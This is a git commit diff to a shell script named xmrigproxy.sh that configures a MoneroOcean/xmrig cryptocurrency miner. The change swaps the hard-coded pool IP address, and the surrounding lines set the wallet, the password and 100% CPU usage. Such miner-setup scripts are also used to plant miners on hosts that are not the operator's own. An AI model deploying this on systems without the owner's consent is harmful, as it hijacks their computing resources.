94c52a8026e30a199f50a8f41e2e3933e2f5a923
junaidd007 <junaidd007@users.noreply.github.com>
2021-04-24 17:59:09 +0400

    Update xmrigproxy.sh

--- xmrigproxy.sh
+++ xmrigproxy.sh
@@ -157,7 +157,7 @@ if [ ! -z $EMAIL ]; then
   PASS="$PASS:$EMAIL"
 fi
 
-sed -i 's/"url": *"[^"]*",/"url": "165.227.137.104:'3333'",/' $HOME/moneroocean/config.json
+sed -i 's/"url": *"[^"]*",/"url": "161.35.16.57:'3333'",/' $HOME/moneroocean/config.json
 sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/moneroocean/config.json
 sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/moneroocean/config.json
 sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/moneroocean/config.json
